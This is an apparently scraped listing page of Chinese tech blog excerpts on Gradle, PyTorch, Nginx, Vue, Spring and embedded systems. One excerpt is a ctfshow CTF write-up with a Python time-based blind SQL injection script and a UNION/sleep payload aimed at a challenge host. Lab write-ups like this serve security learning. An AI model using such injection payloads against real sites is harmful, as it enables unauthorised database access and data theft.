		<a class="list__footer-readmore btn" href="/posts/7cf737db7de2038c0ea8d1b83932bacc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5e618749f4067adbe279b320f3e799b0/" rel="bookmark">
			Gradle发布依赖包到Github仓库
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		上周接了个需求，需要把项目中一个模块打包发布到git上供其他项目使用。
大无语，查了一大堆真的是醉醉的，乱七八糟没有一个好使的，最后还是官方文档靠谱啊，xdm，以后有需求先查官方文档啊！！！
我个人认为，写博客不光是为了记录，同时最好也能帮别人解决一些问题，只有这样一篇博客才多少有点价值吧，写到哪种程度呢，最好是饭都送到嘴边那种程度！！！这样自己回过头来看的时候，也不会一脸懵。
下面想详细说一下gradle发布依赖包到github仓库的具体步骤。
请保证访问github畅通，最好网络好一点，因为上传和下载如果网络不佳，是很可能失败的。
第一步：修改配置 （此处是单个包，多个包参考官网，区别不大，官网地址文末会放）在你需要发布的模块的build.gradle文件中，添加下列代码：
plugins { id 'maven-publish' } publishing { repositories { maven { name = "GitHubPackages" url = uri("https://maven.pkg.github.com/jwcxs-m/jarproject") credentials { username = System.getenv("GITHUB_ACTOR") password = System.getenv("GITHUB_TOKEN") } } } publications { gpr(MavenPublication) { from(components.java) } } } username和password我这里配了环境变量，如果嫌麻烦甚至可以在发包的时候直接给定值，像下面这样：
credentials { username = "Damon" password = "ghp_7asdwrc123dsww34YyqkkpP1jHzvR" } 注意：如果直接填写了token，不要把token直接提交到github仓库中，不然github会检测到你的token被上传到项目里，就强行给你把token停用了！！！
然后就是说password，就是这个token咋生成的：
最后拉到最下方，点这个绿的一键生成。
生成后的token复制出来，因为只有第一次能看到，下次进来就看不到了。然后把token设置给上面的password就行。
第二步：发布 找个喜欢的地方（常用终端或者是IDEA里的终端都行…），直接执行gradle publish（不出意外的话，就会看到发布成功，出意外了再说…）
乌鱼子，刚说完就报错了…
Failed to publish publication 'gpr' to repository 'GitHubPackages' Could not PUT 'https://maven.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5e618749f4067adbe279b320f3e799b0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/27bcd47b7702a338801239c4795cc99c/" rel="bookmark">
			pytorch卷积操作nn.Conv中的groups参数用法解释
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MobileNetV1《MobileNets: Efficient Convolutional Neural Networks for Mobile Vision Applications》_程大海的博客-CSDN博客
《MobileNetV2: Inverted Residuals and Linear Bottlenecks》_程大海的博客-CSDN博客
《ShuffleNet: An Extremely Efficient Convolutional Neural Network for Mobile Devices》_程大海的博客-CSDN博客
pytorch中MobileNetV2分类模型的源码注解_程大海的博客-CSDN博客
pytorch卷积操作nn.Conv中的groups参数用法解释_程大海的博客-CSDN博客_pytorch中groups
最近在项目中使用到了MobileNet分类网络，MobileNet网络中使用到了深度可分离卷积操作，深度可分离卷积将传统卷积操作分成两步来处理。假设输入的特征图feature_map大小为[H, W, C]，深度可分离卷积第一步使用C组NxNx1的卷积核对每个输入通道in_channel进行卷积，卷积输出结果特征图feature_map大小为[H, W, C]，然后使用M个1x1xC的卷积核进行卷积操作，输出的特征图大小为[H, W, M]。深度可分离卷积的目的是减少卷积操作的参数量和计算量，从而提升运算速度。深度可分离卷积表示如下图：
在MobileNet网络中有一步是要对每个通道进行单独的卷积操作，在pytorch实现的MobileNetV2代码中用到了nn.Conv函数的groups参数来完成逐个通道的卷积操作，如下图：
查询pytorch官方文档对于groups参数的解释，看的一脸懵逼？？？大概能看出来这玩意是用来对输入channel和输出channel进行分组的，具体怎么分组，分组后怎么计算，还是一脸懵逼？？？
先大概总结一下groups参数的含义：假设卷积操作的输入通道数是in_channels,输出通道数是out_channles，分组数是groups，分组卷积就是把原本的整体卷积操作分成groups个小组来分别处理，其中每个分组的输入通道数是in_channles / groups,输出通道数是out_channles / groups，最后将所有分组的输出通道数concat，得到最终的输出通道数out_channles，所以在做分组卷积的时候，in_channels和out_channels需要被groups整除
下面就自己动手来试验一下这个参数的用法：
1、首先定义卷积操作的输入数据：
# 输入数据的维度[N, C, H, W] -&gt; [1, 4, 1, 1] # 输出通道数4 data = torch.arange(4, dtype=torch.float32).view(1,4, 1, 1) print(data) 自定义的输入数据长和宽都是1，有4个通道。长下面这个样子：
2、实验groups=1场景
kernel_weight = torch.nn.Parameter(torch.arange(16, dtype=torch.float32).view(4, 4, 1, 1)) print(kernel_weight) conv_groups_1 = nn.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/27bcd47b7702a338801239c4795cc99c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7345f98b527344fb238331851070b5c2/" rel="bookmark">
			OA系统--login
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		&lt;%@ page contentType="text/html;charset=UTF-8" language="java" %&gt; &lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt; &lt;html xmlns="http://www.w3.org/1999/xhtml"&gt; &lt;head&gt; &lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt; &lt;title&gt;欢迎登录后台管理系统&lt;/title&gt; &lt;link href="css/style.css" rel="stylesheet" type="text/css" /&gt; &lt;script language="JavaScript" src="js/jquery.js"&gt;&lt;/script&gt; &lt;script src="js/cloud.js" type="text/javascript"&gt;&lt;/script&gt; &lt;script language="javascript"&gt; $(function(){ $('.loginbox').css({'position':'absolute','left':($(window).width()-692)/2}); $(window).resize(function(){ $('.loginbox').css({'position':'absolute','left':($(window).width()-692)/2}); }) }); &lt;/script&gt; &lt;%--声明js代码--&amp;&gt; &lt;script type="text/javascript"&gt; //声明页面加载事件：给图片验证图片增加单击事件 $(function()){ $("#codeIng").click(function(){ //获取验证码图片对象 var img =$("#codeImage"); //修改scr属性，但不修改uri的值 img.attr("src",img.attr("src")+""+math.radom()) }) }） //给验证码输入框增加焦点事件完成验证码的校验 $(function(){ $("#userCode").blur(function(){ //获取用户输入验证码信息 var userCode=$("#userCode").var(); //发起ajax请求 if("userCode==null userCode ==""){ $("#messageSpan").html("验证码不能位空").css("color","red"); }else if(){ //发起ajax请求 $.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7345f98b527344fb238331851070b5c2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cbac295f07f23fec184711f1077ea85d/" rel="bookmark">
			Linux 图形栈一览：基于 DRM 和 Wayland
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Chen Jie 创作于 2019/11/13
by Chen Jie of TinyLab.org 2019/10/07
本文图示了基于 DRM 还有 Wayland 的 Linux 图形栈。在这个图形栈中，App 将画好的 surface，通过 Wayland 协议提交给 Compositor。Compositor 将来自各个应用的 surface(s) 合成为一帧，通过 DRM 接口最终画在 Frame Buffer，如下图所示：
图 1：Linux 图形栈概览：Wayland 协议, Compositor 和 DRM 子系统
本文接下来自下而上，先介绍 Linux Kernel 的 DRM 子系统，而后步入 Userspace 来介绍：代入两个代表性的 GUI App，情景分析其渲染过程。
通常，GUI App 是通过图形控件库来布局和放置控件。对这类普通 GUI App 渲染过程分析，是为情景分析的第一章节。
随后分析了多媒体 App：它是进一步细分的一个情景，即 App 界面一部分内容，是多媒体。
伴随情景的细分，渲染过程会经由特定的一些软件栈，故而“花开两朵，各表一枝”。
1 背景：DRM —— buffer management、Frame Buffer / plane、Kernel Mode Setting Linux DRM 子系统，主要提供了以下功能：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cbac295f07f23fec184711f1077ea85d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9d590812f81d3e88deb4a3c0699da23a/" rel="bookmark">
			Nginx基础
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Nginx基础 前言一、Nginx应用场景二、使用docker安装Nginx1.搜索Niginx镜像2.拉取Nginx镜像3.创建容器，设置端口映射、目录映射4.使用docker启动 二、静态网站部署1.静态网站的部署2.配置虚拟主机2.1端口绑定2.2域名绑定 三、反向代理和负载均衡1.反向代理配置反向代理 2.负载均衡配置负载均衡 前言 Nginx是一款高性能的http服务器/反向代理服务器及电子邮件代理服务器。由俄罗斯的程序设计师伊⼽尔·⻄索夫（Igor Sysoev）所开发，官方测试nginx能够支撑5万并发链接，并且cpu、内存等资源消耗却非常低，运行非常稳定
一、Nginx应用场景 http服务器。Nginx是一个http服务，可以独立提供http服务。可以做网页静态服务器虚拟主机。可以实现在一台服务器虚拟出多个网站。例如个人网站使用的虚拟主机反向代理，负载均衡。当网站的访问量达到一定程度后，单台服务器不能满足用户的请求时，需要用多台服务器集群，可以使用nginx做反向代理。并且多台服务器可以平均分担负载，不会因为某台服务器负载高宕机而某台服务器闲置的情况 二、使用docker安装Nginx 1.搜索Niginx镜像 docker search nginx 2.拉取Nginx镜像 docker pull nginx 3.创建容器，设置端口映射、目录映射 mkdir ~/nginx	#创建nginx的目录，用于存储nginx数据信息 cd ~/nginx mkdir conf vim nginx.conf nginx.conf 内容
user nginx; worker_processes 1; error_log /var/log/nginx/error.log warn; pid /var/run/nginx.pid; events { worker_connections 1024; } http { include /etc/nginx/mime.types; default_type application/octet-stream; log_format main '$remote_addr - $remote_user [$time_local] "$request" ' '$status $body_bytes_sent "$http_referer" ' '"$http_user_agent" "$http_x_forwarded_for"'; access_log /var/log/nginx/access.log main; sendfile on; #tcp_nopush on; keepalive_timeout 65; #gzip on; include /etc/nginx/conf.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9d590812f81d3e88deb4a3c0699da23a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4fdfc1503814181474332bc9dcce987a/" rel="bookmark">
			SpringBoot详解（1）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		微服务阶段 javase：oop
mysql：持久化
html+css+js+jquery+框架：视图（框架不熟练）
javaweb：独立开发mvc三层架构网站（较为原始）
ssm：简化了我们的配置流程。（但是随着项目迭代，配置文件臃肿复杂，依赖管理混乱影响项目部署上线速度）
上边的技术框架项目都是打war包部署到tomcat中（而springboot打jar包，且内置tomcat）
于是就有了接下来的spring再简化，于是诞生了——&gt;springboot微服务架构。
服务越来越多——&gt;便有了SpringCloud
为什么要学Springboot 传统Spring的痛点：
复杂的配置
项目各种配置其实是开发时的损耗， 因为在思考 Spring 特性配置和解决业务问题之间需要进行思维切换，所以写配置挤占了写应用程序逻辑的时间。
回顾一下传统Spring MVC 应用的开发流程：
新建Web工程，将spring-framework的jar包复制到工程中添加web.xml文件，配置DispatcherServlet &lt;web-app&gt; &lt;listener&gt; &lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listener-class&gt; &lt;/listener&gt; &lt;context-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;/WEB-INF/app-context.xml&lt;/param-value&gt; &lt;/context-param&gt; &lt;servlet&gt; &lt;servlet-name&gt;app&lt;/servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt; &lt;init-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;&lt;/param-value&gt; &lt;/init-param&gt; &lt;load-on-startup&gt;1&lt;/load-on-startup&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;app&lt;/servlet-name&gt; &lt;url-pattern&gt;/app/*&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; &lt;/web-app&gt; 配置Spring MVC，配置包扫描、注解处理映射器、注解处理适配器、拦截器、视图解析器、控制器等等 &lt;mvc:annotation-driven conversion-service="conversionService"/&gt; &lt;bean id="conversionService" class="org.springframework.format.support.FormattingConversionServiceFactoryBean"&gt; &lt;property name="converters"&gt; &lt;set&gt; &lt;bean class="org.example.MyConverter"/&gt; &lt;/set&gt; &lt;/property&gt; &lt;property name="formatters"&gt; &lt;set&gt; &lt;bean class="org.example.MyFormatter"/&gt; &lt;bean class="org.example.MyAnnotationFormatterFactory"/&gt; &lt;/set&gt; &lt;/property&gt; &lt;property name="formatterRegistrars"&gt; &lt;set&gt; &lt;bean class="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4fdfc1503814181474332bc9dcce987a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2f10bcdeb2db5742f9134cba5fb95179/" rel="bookmark">
			Vue登陆功能详情
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、先创建修饰好页面 Login.vue：
&lt;template&gt; &lt;div class="login_container"&gt; &lt;!-- 登陆框 --&gt; &lt;div class="login_box"&gt; &lt;!-- 登陆图标 --&gt; &lt;div class="avatar_box"&gt; &lt;img src="../assets/logo.png" alt="" /&gt; &lt;/div&gt; &lt;el-form class="login_form"&gt; &lt;!-- 用户名 --&gt; &lt;el-form-item prop="username"&gt; &lt;el-input placeholder="用户名" prefix-icon="iconfont icon-yonghu"&gt; &lt;/el-input&gt; &lt;/el-form-item&gt; &lt;!-- 密码 --&gt; &lt;el-form-item prop="password"&gt; &lt;el-input placeholder="密码" prefix-icon="iconfont icon-mima" type="password" &gt; &lt;/el-input&gt; &lt;/el-form-item&gt; &lt;!-- 按钮 --&gt; &lt;el-form-item class="login_button"&gt; &lt;el-button type="primary"&gt;登陆&lt;/el-button&gt; &lt;el-button type="info"&gt;重置&lt;/el-button&gt; &lt;/el-form-item&gt; &lt;/el-form&gt; &lt;/div&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; export default {} &lt;/script&gt; &lt;style lang="less" scoped&gt; /* login_container容器 */ .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2f10bcdeb2db5742f9134cba5fb95179/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/483c280f116d086ea73b04913b571e3a/" rel="bookmark">
			通过BACnet物联网关实现楼宇自动化的物联网解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 随着楼宇自动化、暖通控制系统的物联网发展趋势更加快速，一种低成本、高可靠性的协议转换物联网关是不可忽视的关键硬件。下面我们分享一款主流的BAS、HAVC行业的BACnet物联网关BL103的主要功能特点。
一、多协议转换功能： 作为一款BACnet物联网关，需要具备多种常用的协议转换功能，BACnet网关BL103 是一款经济型楼宇自动化、暖通控制系统的物联网关,用于实现BACnet MS/TP转BACnet/IP, Modbus转BACnet/IP, BACnet转MQTT, BACnet转 OPC UA协议。
二、丰富的接口与稳定可靠的系统 BACnet网关需要采用嵌入式ARM MCU，基于Linux OS，装有1WAN/LAN, 1LAN, 1 RS485, 4G模块可选。
三、内置云驱动功能 BACnet网关需要具有强大的协议转换功能，BL103可以实现同时采集多种协议，包括：BACnet MS/TP, BACnet/IP, Modbus RTU, Modbus TCP, DLT645.上行支持BACnet/IP，Modbus TCP，MQTT, OPC UA等协议，内置了华为云、阿里云、金鸽云、亚马逊云、Thingsboard云、Sparkplug B等云驱动，可以直接接入到各种主流云平台。
四、网络安全与数据安全 BACnet网关BL103支持OPENVPN网络安全防护协议，兼容TLS SSL X.509根证书等数据加密技术来确保数据安全，采用特有的断点数据补传的数据完整性技术;
五、人性化的配置 BACnet网关BL103集成了钡铼技术秉承的人性化配置界面，以及远程配置、远程升级固件等功能；
六、体积小、冗余电源设计 BACnet网关BL103采用紧固结构，冗余的电源设计，标准的DIN35导轨安装。
作为暖通行业的物联网关，大致需要上述的功能。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/096a275e7e4858e3798e0ff3aabf001c/" rel="bookmark">
			嗯？线上又OOM，我太难了...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		「 关注“石杉的架构笔记”，大厂架构经验倾囊相授 」
儒猿技术团队最新出品
《大型企业级分布式订单系统项目实战》
（点击查看详情）
文章来源：石杉的架构笔记原创文章
今天给大家分享一个我们之前基于 dubbo 开发一个线上系统时候遇到的内存泄漏生产问题的排查与优化实践经验。
相信对于大家多看一些类似的案例，以后对于大家自己在线上系统遇到各种生产问题的时候，进行排查和优化的思路会有很大的启发。
事故背景
先给大家简单说一下这个问题的发生背景，线上生产环境部署了两个系统，我们可以认为是系统 A 和系统 B，同时系统 B 因为是大流量核心系统，所以部署了几十台机器，定位就是集群部署要抗每秒几万的 TPS 的，两台系统之间是基于 dubbo 作为 rpc 调用框架，注册中心用的是 zookeeper。
如下图所示：
在这个背景之下，某一天系统 B 因为更新了代码，因此发起了一次几十台机器的全量滚动更新和部署。
也就是说，系统 B 的开发团队基于最新的代码把几十台机器依次用最新代码重新部署了一遍，也就是每台机器都会有一次系统停止和重启的过程。
如下图所示：
没想到生产环境的灾难性故障就这么突然发生了，在系统 B 的几十台机器依次重新部署之后，结果系统 A 的开发团队惊讶的发现自己的系统居然过了一会就发送了 jvm 内存使用率飙升超过 90% 的告警，而且很快系统 A 居然就直接 OOM 内存溢出崩溃了。
如下图所示：
于是系统 B 的开发团队顺利的把一个大版本更新了几十台机器之后，心满意足的欣赏自己的成果呢，系统 A 的开发团队突然开始一脸懵逼的手忙脚乱进行了生产故障的排查。
那么大家可以想想，这个时候，如果是你负责的线上系统突然给你发送内存使用率飙升超过 90%，而且很快就 oom 内存溢出，你会怎么排查？
排查思路
这里给大家说说当时我们是怎么进行排查的，首先，遇到这种内存突然飙升然后导致 oom 的情况，先看看是不是外部对你的请求流量过大导致的。
因为往往这种突发性的问题，都是外部流量突然飙升导致的，这里先给分析一种外部流量突然飙升导致系统 oom 的场景。
假设你平时常规化运作的时候，每次一批请求过来会在你的 jvm 年轻代里创建一批对象，接着这批请求处理完毕了，之前创建的那批对象就会成为垃圾对象了，然后下一批请求过来，又在 jvm 年轻代里创建了一批对象。
如下图所示：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/096a275e7e4858e3798e0ff3aabf001c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8071efcfd35cab6da80dd22c9e6ecaec/" rel="bookmark">
			OA系统--用户登录响应结果
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		package com.bjsxt.controller; import com.bjsxt.Employee; import com.bjsxt.service.impl.UserServicelmpl; import com.sun.net.httpserver.HttpServer; import javax.jws.WebService; import javax.servlet.ammotation.webServlet; import javax.servlet.http.HttpServlet; import javax.servlet.ServletException; import javax.servlet.http.SttpServletRequest; import javax.servlet.http.Http.HttpServletRespomse; import javax.io.IoeXCEPTION; import java.io.IOException; @WebServlet("/userServlet"); public class UserServlet&lt;employee&gt; extends HttpServlet { @Override protected void service(HttpServletRequest req,HttpServletResponse resp)throws servletException, IOException //设置编码个数 req.setCharactterEncoding("utf-8"); //设置编码格式 resp.setCometentType("text/html;charset=utf-8"); resp.setContentType("utf-8"); //获取请求信息 String empid = req.getParameter(s:"empid"); String password =req.getParameter(s:"password"); //处理请求 //创建业务层对象 UserServlet userServlet = new UserServicelmpl(); //调用业务层方法 Employee employee = userServlet.empLoginService(empid,password); //响应结果 if(employee != null){ //将用户信息存储到session中 req.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8071efcfd35cab6da80dd22c9e6ecaec/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/457078786572456ac863f097ce0befee/" rel="bookmark">
			本人的一些总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		有关idea 1、maven仓库的问题
步骤:
1、先看看设置里面的仓库，是不是自己的仓库。如果不是的话，先换成自己的仓库。(必须注意的)
2、检查一下你本地库里面，是不是有未下载完的文件。类似与这样的文件，删一下，仓库可能没有下载完毕。
2、mvn package看看
百度mvn package的使用方法。
3、idea上就是爆出xxx.jar不存在，明明配置了自己的maven仓库。
mvn dependency:sources　// 命令jar包被下载下来
首选这种
有关flink 1、代码中容易忽略的地址问题。
只要没有new，就是同一个地址，也就是对同一个地址上的内容进行修改。
package com.atguigu.app.function; import com.alibaba.fastjson.JSONObject; public class test { public static void main(String[] args) { // {"after":"123456","tablename":"table1","db":"database","before2":"xyz","before1":"xyz"} JSONObject value=new JSONObject(); value.put("db", "database") ; value.put("tablename", "table1"); value.put("before1", "xyz"); value.put("before2", "xyz"); value.put("after", "123456"); System.out.println(value.toString()); // {"value":{"after":"123456","tablename":"table1","db":"database","before2":"xyz","before1":"xyz"}} JSONObject value1=new JSONObject(); value1.put("value",value) ; // {"after":"123456","tablename":"table1","db":"database","before2":"xyz","before1":"xyz"} JSONObject data = value1.getJSONObject("value"); String filterColumn = "db"+","+"tablename"+","+"after"; test2.filterColumn(data, filterColumn); System.out.println(value1.toString()); } } {"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/457078786572456ac863f097ce0befee/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2de00d58808b53d55c655735ec5fa40b/" rel="bookmark">
			ARM Cortex-M0系统简介
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如何独自搭建一个CM0系统
在用keil调试开发时我们会见到如下界面
下面则是一些具体含义
处理器模式 Thread mode模式用于执行应用软件。当复位结束时，处理器进入线程模式。
Handler mode异常处理模式。处理器在完成所有异常处理后返回到Thread模式。
Stack 处理器使用完整的降序堆栈。这意味着堆栈指针指示堆栈内存中最后一个堆叠项。当处理器将一个新项压入堆栈时，它会减少堆栈指针，然后将该项写入新的内存位置。处理器实现了两个栈，主栈和进程栈，它们有独立的栈指针副本
核心寄存器 NameDescriptionR0-R12R0-R12是用于数据操作的通用寄存器MSP (R13) PSP (R13)堆栈指针(SP)是寄存器R13。在线程模式下，控制寄存器指示要使用的堆栈指针，主堆栈指针(MSP)或进程堆栈指针(PSP)LR (R14)链路寄存器(LR)是寄存器R14。它存储子例程、函数调用和异常的返回信息PC (R15)程序计数器(PC)是寄存器R15。它包含当前程序地址PSR程序状态寄存器(PSR)包括:应用程序状态寄存器(APSR) •中断程序状态寄存器(IPSR)•执行程序状态寄存器(EPSR)CONTROL当处理器处于线程模式时，控制寄存器控制使用的堆栈 AHB-Lite 部分接口 AHB-Lite实现了高性能、高时钟频率系统所需的功能，包括
•突发传输
•单时钟边缘操作
•非三态实现
•宽数据总线配置，64、128、256、512和1024位。
最常见的AHB-Lite从机是内部内存设备、外部内存接口和高带宽外设。
虽然低带宽外设可以作为AHB-Lite从设备，但由于系统性能的原因，它们通常位于AMBA高级外设总线(APB)上。
这个高级总线和APB之间的桥接是通过一个AHB-Lite从机完成的，这个从机被称为APB桥接。
因为AHB-Lite是一个单一的主总线接口，所以如果需要一个多主系统，系统设计者必须包含一个组件来隔离所有主系统。为了实现这个隔离功能，可以将每个主服务器视为在自己的层上，因此组件必须创建一个多层互连，其中所有主服务器彼此隔离，但可以共享对从服务器的访问。从仲裁必须由多层互连组件执行
Memory model 介绍Cortex-M0设备的内存映射和内存访问行为。处理器有一个固定的内存映射，提供高达4GB的可寻址内存。内存映射是:
内存区域、类型和属性
内存映射被分割成多个区域。
每个区域都有一个已定义的内存类型，有些区域还有额外的内存属性。
内存类型和属性决定了访问该区域的行为。
内存类型有:
Normal
为了提高效率，处理器可以对事务重新排序，或者执行投机读操作
Device
处理器相对于设备或强顺序内存的其他事务保持事务顺序。
Strongly-ordered
处理器保持相对于所有其他事务的事务顺序。
地址区域参数确定到主接口的布线。
当定义了多组地址区域参数时，每个主接口可以有多个非连续地址区域。然而，不同主机的地址区域接口不得重叠。mem_lo参数定义下限地址和mem_hi参数定义主接口的上限地址。
&lt;slave_interface name="SI1"&gt; &lt;address_region interface="MI0" mem_lo="40000000" mem_hi="4fffffff" remapping="move"/&gt; &lt;address_region interface="MI0" mem_lo="70000000" mem_hi="7fffffff" remapping="alias"/&gt; &lt;address_region interface="MI1" mem_lo="80000000" mem_hi="9fffffff" remapping="none"/&gt; &lt;address_region interface="MI2" mem_lo="a0000000" mem_hi="bfffffff" remapping="move"/&gt; &lt;address_region interface="MI3" mem_lo="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2de00d58808b53d55c655735ec5fa40b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/06e7d3b859b7972e3ae5413fb2d37ce8/" rel="bookmark">
			ctfshow web175-183
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
Web 175
Web 176
Web 177
Web 178
Web 179
Web 180
Web 181
Web 182
Web 183
Web 175 if(!preg_match('/[\x00-\x7f]/i', json_encode($ret))) 刚开始不知道这句话是什莫意思，还在尝试之前的方法，发现没用。
\xnn 匹配ASCII代码中十六进制代码为nn的字符
[\x00-\x7f] 匹配ASCII值从0-127的字符
所以ASCII值得0-127都被过滤了，select没法用了。
只能盲注了，试一下 1' and sleep(6)--+ 发现确实有延迟，所以可以考虑时间盲注。 时间盲注： 通过时间函数使SQL语句执行时间延长，从页面响应时间判断条件是否正确的一种注入方式。简单说就是，当页面出现延时响应，且响应时间与设定的时间函数一致，则表示前半部分的猜测正确，若出现查询直接返回结果，页面响应未出现延迟，则说明未执行到时间函数的部分，and的判断中，前半部分就已经出错了。 利用脚本来获取flag。 import requests from time import time url='http://774b555f-930c-4ab9-acbe-7ef82922d659.chall.ctf.show/api/v5.php' flag='' for i in range(1,100): length=len(flag) min=32 max=128 while 1: j=min+(max-min)//2 if min==j: flag+=chr(j) print(flag) break payload="?id=' union select 'a',if(ascii(substr((select group_concat(password) from ctfshow_user5 where username='flag'),%d,1))&lt;%d,sleep(0.5),1) -- -"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/06e7d3b859b7972e3ae5413fb2d37ce8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6624ce9eed6e85ea8127e0f807774246/" rel="bookmark">
			Vue3.2 中的 setup 语法糖，保证你看的明明白白
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这里Vue3.2 中的 setup 语法糖，保证你看的明明白白 vue3.2 到底更新了什么？setup的简单介绍变量、方法不需要 return 出来组件不需要在注册分析引入setup 后组件的变化新增definePropsdefineProps的使用父组件传递参数子组件接受参数 子组件怎么向父组件抛出事件？defineEmits的到来子组件使用父组件 如何获取子组件中的属性值子组件父组件 新增指令 v-memostyle v-bind 该同学已经从实验室毕业了style v-bind将span变成红色文章转载于 vue3.2 到底更新了什么？ 根据原文内容的更新的内容主要有以下 5 块： 1.SSR：服务端渲染优化。@vue/server-renderer包加了一个ES模块创建， 与Node.js解耦，使在非Node环境用@vue/serve-render做服务端渲染成为可能， 比如(Workers、Service Workers) 2.New SFC Features：新的单文件组件特性 3.Web Components：自定义 web 组件。这个我们平时很少用到，但是应该知道 4.Effect Scope API：effect 作用域， 用来直接控制响应式副作用的释放时间(computed 和 watchers)。 这是底层库的更新，开发不用关心，但是应该知道 5.Performance Improvements：性能提升。这是内部的提升，跟开发无关 setup的简单介绍 起初 Vue3.0 暴露变量必须 return 出来，template中才能使用； 这样会导致在页面上变量会出现很多次。 很不友好，vue3.2只需在script标签中添加setup。 可以帮助我们解决这个问题。 1.组件只需引入不用注册，属性和方法也不用返回， 也不用写setup函数，也不用写export default ， 甚至是自定义指令也可以在我们的template中自动获得。 变量、方法不需要 return 出来 &lt;template&gt; &lt;div class="home"&gt; 显示的值{{flag }} &lt;button @click="changeHander"&gt;改变值&lt;/button&gt; &lt;/div&gt; &lt;/template&gt; &lt;!-- 只需要在script上添加setup --&gt; &lt;script lang="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6624ce9eed6e85ea8127e0f807774246/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d9d9054a7d650834172f5f8ff1285d78/" rel="bookmark">
			C&#43;&#43; sort函数（升序降序排列）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 sort 函数类似于快排，执行效率为n*log2(n),优于冒泡排序和选择排序。
#include&lt;iostream&gt; #include&lt;algorithm&gt;//必须包含的头文件 using namespace std; int main() { int arr[10] = { 2,4,1,6,9,10,11,23,45,15}; //升序排列 sort(arr, arr + 10);//参数分别是起始地址，结束地址，排序分式（默认从小到大） for (int i = 0; i &lt; 10; i++) cout &lt;&lt; arr[i] &lt;&lt; " "; cout &lt;&lt; endl; //降序排列 sort(arr, arr + 10, greater&lt;int&gt;());//可以使用模板，也可以自己写比较函数 for (int i = 0; i &lt; 10; i++) cout &lt;&lt; arr[i] &lt;&lt; " "; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
